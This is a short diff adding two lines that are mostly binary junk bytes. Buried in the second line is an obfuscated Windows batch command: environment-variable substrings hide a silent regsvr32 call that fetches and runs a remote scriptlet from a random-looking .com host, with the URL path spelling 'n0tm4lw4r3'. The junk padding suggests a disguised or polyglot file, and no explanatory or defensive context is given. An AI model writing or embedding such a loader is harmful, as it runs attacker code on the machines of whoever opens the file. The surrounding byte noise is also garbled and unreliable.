@@ -1,0 +1,2 @@
+ Û 2 ?    ½ ¤ N - ½ ? ?    ä % *  ê ? £ À | ? m  ? y  * è ¥ ? á ²  P   Å    í Q ¯ ï s £  × % " 9 ? Q í ò Y »  ò ¿ ö ²   y Í } ß A / Ñ ¡ ù % ,  k ¥  Ê 2 ô §
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://WjJfBNKXgLnZqHcbsSIzOTPAvUQGkCoaVuiMEeDh%ALLUSERSPROFILE:~4,1%lmx%ALLUSERSPROFILE:~4,1%wpYdtFy.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  Û 2 ?    ½ ¤ N - ½ ? ?    ä % *  ê ? £ À | ? m  ? y  * è ¥ ? á ²  P   Å    í Q ¯ ï s £  × % " 9 ? Q í ò Y »  ò ¿ ö ²   y Í } ß A / Ñ ¡ ù % ,  k ¥  Ê 2 ô §
